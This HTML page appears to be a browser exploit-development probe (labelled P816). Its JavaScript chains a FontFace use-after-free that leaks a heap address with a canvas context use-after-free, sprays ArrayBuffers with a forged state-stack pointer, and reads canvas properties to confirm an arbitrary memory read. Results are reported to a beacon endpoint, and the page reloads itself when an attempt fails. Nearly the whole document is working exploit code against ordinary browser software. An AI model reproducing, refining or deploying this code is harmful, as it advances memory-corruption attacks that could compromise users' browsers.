<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P816</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;}
</style>
</head><body>
<pre id="o">P816: fillStyle on AB-reclaimed context (NO Image beacons near read)</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}

var _bq=[];
function bn(t,d){_bq.push([t,d||'']);}
function flushBn(){
  for(var i=0;i<_bq.length;i++){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/beacon.php?tag=P816-'+encodeURIComponent(_bq[i][0])+'&data='+encodeURIComponent(String(_bq[i][1]).slice(0,900))+'&t='+Date.now(),false);
      x.send();
    }catch(e){}
  }
  _bq=[];
}

/* ========== PHASE 1: FontFace UAF → H ========== */
var st=document.createElement('style');
st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);
var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs=[],ffired=false;
Object.defineProperty(FontFace.prototype,'then',{
  configurable:true,
  get:function(){
    if(ffired)return undefined;
    ffired=true;
    if(st){st.remove();st.textContent='';st=null;}
    try{document.fonts.delete(this);}catch(e){}
    document.body.offsetHeight;
    fabs=[];
    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
    try{document.fonts.check('1em bb1');}catch(e){}
    document.body.offsetHeight;
    return undefined;
  },set:function(){}
});
document.fonts.load('1em f1, bb1','AB');

setTimeout(function(){
  delete FontFace.prototype.then;

  /* Find FontFace AB */
  var bestI=-1,bestNz=0;
  for(var i=0;i<fabs.length;i++){
    var u=new Uint8Array(fabs[i]),nz=0;
    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
    if(nz>bestNz){bestNz=nz;bestI=i;}
  }
  if(bestI<0||bestNz<4){
    bn('FONT-MISS','nz='+bestNz);flushBn();
    log('FontFace miss — reloading','fail');
    setTimeout(function(){location.reload();},200);
    return;
  }

  var fontAB=fabs[bestI];
  var fontDV=new DataView(fontAB);
  var q11lo=fontDV.getUint32(0x58,true);
  var q11hi=fontDV.getUint32(0x5C,true);
  if(q11hi===0){
    bn('FONT-BAD','');flushBn();
    log('FontFace bad q11','fail');
    setTimeout(function(){location.reload();},200);
    return;
  }
  var borrow=(q11lo<0x68)?1:0;
  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
  log('H = '+Hstr,'ok');

  /* Prepare fontAB as our STATE buffer:
     We'll point m_stateStack.m_buffer to H.
     At H (fontAB), set up a fake State struct:
     - +0: globalAlpha = 1.0 (0x3FF0000000000000)
     - +16: fillStyle CanvasStyle = Color type + known RGBA
     - +32: strokeStyle CanvasStyle = Color type + known RGBA
     - +48: lineWidth = 9876.5 (marker)

     CanvasStyle layout (testing multiple hypotheses):
     We'll zero everything and then set specific RGBA patterns
     at multiple offsets within the 16B fillStyle region.

     Hypothesis A: type=0 is at byte 0, RGBA is at byte 4-7
     Hypothesis B: RGBA is at byte 0-3, type is at byte 8+
     Hypothesis C: it's a WTF::Variant with index at end

     Strategy: zero the entire 192B, then write marker patterns.
     If type=0 means Color, zeros = transparent black. */

  /* Zero entire fontAB */
  var fontU8=new Uint8Array(fontAB);
  for(var i=0;i<192;i++)fontU8[i]=0;

  /* globalAlpha at State+0 = 1.0 */
  fontDV.setFloat64(0, 1.0, true);

  /* fillStyle at State+16 — write RGBA marker bytes at several offsets:
     We'll try: the RGBA might be at +16, +17, +18, +19 or +20, +21, +22, +23
     or at +24, +25, +26, +27.

     Set bytes 16-31 to a distinctive pattern: */
  fontU8[16]=0x00; fontU8[17]=0x00; fontU8[18]=0x00; fontU8[19]=0x00;  /* first 4B: type=0 (Color) hopefully */
  fontU8[20]=0xAA; fontU8[21]=0xBB; fontU8[22]=0xCC; fontU8[23]=0xFF;  /* second 4B: RGBA marker */
  fontU8[24]=0x11; fontU8[25]=0x22; fontU8[26]=0x33; fontU8[27]=0x44;  /* third 4B: alt RGBA */
  fontU8[28]=0x55; fontU8[29]=0x66; fontU8[30]=0x77; fontU8[31]=0x88;  /* fourth 4B: more bytes */

  /* strokeStyle at State+32: similar pattern */
  fontU8[32]=0x00; fontU8[33]=0x00; fontU8[34]=0x00; fontU8[35]=0x00;
  fontU8[36]=0xDD; fontU8[37]=0xEE; fontU8[38]=0xFF; fontU8[39]=0x99;
  fontU8[40]=0x12; fontU8[41]=0x34; fontU8[42]=0x56; fontU8[43]=0x78;
  fontU8[44]=0x9A; fontU8[45]=0xBC; fontU8[46]=0xDE; fontU8[47]=0xF0;

  /* lineWidth at State+48 = 9876.5 */
  fontDV.setFloat64(48, 9876.5, true);

  /* miterLimit at State+64 = 5432.1 */
  fontDV.setFloat64(64, 5432.1, true);

  bn('FONT-OK','H='+Hstr);

  /* ========== PHASE 2: Canvas UAF ========== */
  var innerCtx=null;
  var canvas=document.createElement('canvas');
  canvas.width=1;canvas.height=1;
  var opts={};
  Object.defineProperty(opts,'alpha',{
    get:function(){
      innerCtx=canvas.getContext('2d');
      return true;
    }
  });
  canvas.getContext('bitmaprenderer',opts);

  if(!innerCtx){
    bn('UAF-FAIL','');flushBn();
    log('Canvas UAF failed','fail');
    setTimeout(function(){location.reload();},200);
    return;
  }

  /* ========== PHASE 3: AB(768) spray with forged m_stateStack ========== */
  /*
   * CRITICAL: NO Image beacons, NO DOM allocation, NO GC pressure
   * between the spray and the first read. P813v4's crash may have been
   * from the GC visitor walking m_canvas, not from the property getter.
   *
   * We zero-fill the AB except for m_stateStack fields.
   * m_canvas at +32 will be 0 (null) — if the getter doesn't check it, fine.
   * If GC runs and checks it, we crash — but we minimize allocations.
   */
  var SPRAY=500;
  var abs768=[];
  var dv768s=[];

  for(var s=0;s<SPRAY;s++){
    var ab=new ArrayBuffer(768);
    var dv=new DataView(ab);

    /* m_stateStack at +112: point to H (our fontAB) */
    dv.setUint32(112, H_lo, true);   /* m_buffer lo */
    dv.setUint32(116, H_hi, true);   /* m_buffer hi */
    dv.setUint32(120, 1, true);      /* m_capacity */
    dv.setUint32(124, 1, true);      /* m_size */

    /* Everything else stays zero (vtable=0, m_canvas=0, etc.) */

    abs768.push(ab);
    dv768s.push(dv);
  }

  /* ========== PHASE 4: IMMEDIATE READ — no allocations! ========== */
  /*
   * Try properties in order of least likely to crash:
   * 1. fillStyle — might not call scriptExecutionContext()
   * 2. strokeStyle — same
   * 3. globalAlpha — simple double read
   * 4. lineWidth — P813v4 crashed here
   *
   * Collect ALL results before ANY beacons.
   * Use pre-allocated string variables only.
   */
  var R={};

  /* TEST 1: fillStyle */
  try{
    R.fs=innerCtx.fillStyle;
    R.fsOk=true;
  }catch(e){
    R.fs='ERR:'+e.message;
    R.fsOk=false;
  }

  /* TEST 2: strokeStyle */
  try{
    R.ss=innerCtx.strokeStyle;
    R.ssOk=true;
  }catch(e){
    R.ss='ERR:'+e.message;
    R.ssOk=false;
  }

  /* TEST 3: globalAlpha */
  try{
    R.ga=innerCtx.globalAlpha;
    R.gaOk=true;
  }catch(e){
    R.ga='ERR:'+e.message;
    R.gaOk=false;
  }

  /* TEST 4: lineWidth */
  try{
    R.lw=innerCtx.lineWidth;
    R.lwOk=true;
  }catch(e){
    R.lw='ERR:'+e.message;
    R.lwOk=false;
  }

  /* TEST 5: miterLimit */
  try{
    R.ml=innerCtx.miterLimit;
    R.mlOk=true;
  }catch(e){
    R.ml='ERR:'+e.message;
    R.mlOk=false;
  }

  /* ========== PHASE 5: Now beacon everything ========== */
  bn('H',Hstr);
  bn('FS','val='+R.fs+'|ok='+R.fsOk);
  bn('SS','val='+R.ss+'|ok='+R.ssOk);
  bn('GA','val='+R.ga+'|ok='+R.gaOk);
  bn('LW','val='+R.lw+'|ok='+R.lwOk);
  bn('ML','val='+R.ml+'|ok='+R.mlOk);

  /* Mark which tests passed */
  var passed=[];
  if(R.fsOk) passed.push('FS');
  if(R.ssOk) passed.push('SS');
  if(R.gaOk) passed.push('GA');
  if(R.lwOk) passed.push('LW');
  if(R.mlOk) passed.push('ML');

  if(passed.length===0){
    bn('RESULT','ALL_CRASHED');
  }else if(passed.length===5){
    bn('RESULT','ALL_PASSED|'+passed.join(','));
  }else{
    bn('RESULT','PARTIAL|'+passed.join(','));
  }

  /* Check for our marker values */
  if(R.lwOk && R.lw===9876.5) bn('LW-MATCH','FORGED_STATE_CONFIRMED');
  if(R.mlOk && R.ml===5432.1) bn('ML-MATCH','FORGED_STATE_CONFIRMED');
  if(R.gaOk && R.ga===1.0) bn('GA-MATCH','FORGED_ALPHA_CONFIRMED');

  /* Check fillStyle for our RGBA markers */
  if(R.fsOk){
    var fsLower=String(R.fs).toLowerCase();
    /* Check if any of our marker bytes appear */
    if(fsLower.indexOf('170')>=0||fsLower.indexOf('aa')>=0||fsLower.indexOf('bb')>=0||fsLower.indexOf('cc')>=0){
      bn('FS-MARKER','HIT:'+R.fs);
    }
    if(fsLower.indexOf('17')>=0||fsLower.indexOf('34')>=0||fsLower.indexOf('51')>=0){
      bn('FS-ALT-MARKER','HIT:'+R.fs);
    }
  }

  bn('DONE','passed='+passed.length+'/5');
  flushBn();

  log('','');
  log('=== P816 RESULTS ===','ok');
  log('fillStyle:   '+R.fs+' ['+R.fsOk+']', R.fsOk?'ok':'fail');
  log('strokeStyle: '+R.ss+' ['+R.ssOk+']', R.ssOk?'ok':'fail');
  log('globalAlpha: '+R.ga+' ['+R.gaOk+']', R.gaOk?'ok':'fail');
  log('lineWidth:   '+R.lw+' ['+R.lwOk+']', R.lwOk?'ok':'fail');
  log('miterLimit:  '+R.ml+' ['+R.mlOk+']', R.mlOk?'ok':'fail');
  log('H = '+Hstr,'info');
  log('Passed: '+passed.length+'/5','hot');

  if(R.lwOk && R.lw===9876.5){
    log('','');
    log('*** FORGED STATE READ CONFIRMED! ***','hot');
    log('*** lineWidth read our marker from H+48! ***','hot');
    log('*** ARBITRARY READ IS POSSIBLE! ***','hot');
  }

  /* Cleanup: zero ABs to prevent GC visiting stale data */
  for(var c=0;c<abs768.length;c++){
    var u8=new Uint8Array(abs768[c]);
    for(var z=0;z<768;z++)u8[z]=0;
  }

},600);
</script></body></html>
